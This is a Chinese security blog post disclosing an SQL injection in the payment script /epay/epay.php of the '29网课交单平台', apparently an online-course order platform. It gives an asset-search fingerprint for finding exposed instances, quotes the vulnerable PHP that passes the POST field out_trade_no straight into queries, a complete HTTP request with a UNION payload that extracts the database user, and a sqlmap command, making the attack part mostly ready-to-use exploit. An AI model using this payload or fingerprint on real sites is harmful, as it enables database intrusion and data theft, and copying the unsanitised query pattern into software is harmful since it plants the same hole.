#  29网课交单平台存在SQL注入漏洞   
原创 Swimt  星悦安全   2024-06-06 20:59  
  
**漏洞简介**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
    29网课交单平台是一款和发卡网对接的网课代学平台，拥有聚合支付，论文编辑等功能，其后台的可用性及可靠性得到了使用者的认可  
。  
  
  
**资产详情**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
```
资产测绘:"/apisub.php"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dXkAbCDvZAicVxaEnGfRo3CzKjLP89r4aXFZdLkzHzHWwRDbBO3nqB9lGAiapWQrEXELJaYU30lZAw/640?wx_fmt=other&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dXkAbCDvZAicVxaEnGfRo3CGM9rdRNxvIuqEWPD3Jo0O925EyLDfSXEZzpzUjp5st645VovemNS6Q/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dXkAbCDvZAicVxaEnGfRo3CVsJhtfWneESuZNWSoKZP1FuianmXHhU6yRnvAy2yiaNPugxmkTRVFcibg/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**漏洞复现**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**在 /epay/epay.php 存在一个很明显的sql注入，且无 daddslashes 过滤(其他多数文件都有)，导致注入，其中out_trade_no直接被POST带入sql查询字句中.**  
```
<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <title>正在跳转支付界面...</title>
</head>
<?php
include("../confing/common.php");
require_once("epay/submit.class.php");
$type = $_POST['type'];  //支付方式
$out_trade_no=$_POST['out_trade_no'];//支付单号
$row=$DB->get_row("select * from qingka_wangke_pay where `out_trade_no`='{$out_trade_no}' limit 1 ");
$DB->query("update `qingka_wangke_pay` set `type`='$type' where `out_trade_no`='{$out_trade_no}'");
```  
  
**Payload(注入出数据库账户):**  
```
POST /epay/epay.php HTTP/1.1
Content-Length: 113
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Host: 127.0.0.1
Origin: http://127.0.0.1
Referer: http://127.0.0.1/
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Connection: close

out_trade_no=' UNION ALL SELECT 1,CONCAT(IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),3,4,5,6,7,8,9,10,11,12,13-- -
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dXkAbCDvZAicVxaEnGfRo3CCI0e6LwkpORWicWQ2XibOxPFpYZk3cbMnWuDcE6QmuaB5Px3skWAdvJw/640?wx_fmt=other&from=appmsg "")  
**Sqlmap语句:****python sqlmap.py -r a.txt --level=3 --dbms=mysql**  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dXkAbCDvZAicVxaEnGfRo3CYrn3ajE1abWbaJibsCibvUInZhXQb6hRwPtq3RjExXKzbJz36icAtzz9A/640?wx_fmt=other&from=appmsg "")  
  
  
**大家多多关注公众号，一直更新优质文章哟**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**免责声明**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/HVNK6rZ71oofHnCicjcYq2y5pSeBUgibJg8K4djZgn6iaWb6NGmqxIhX2oPlRmGe6Yk0xBODwnibFF8XCjxhEV3K7w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
    **文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
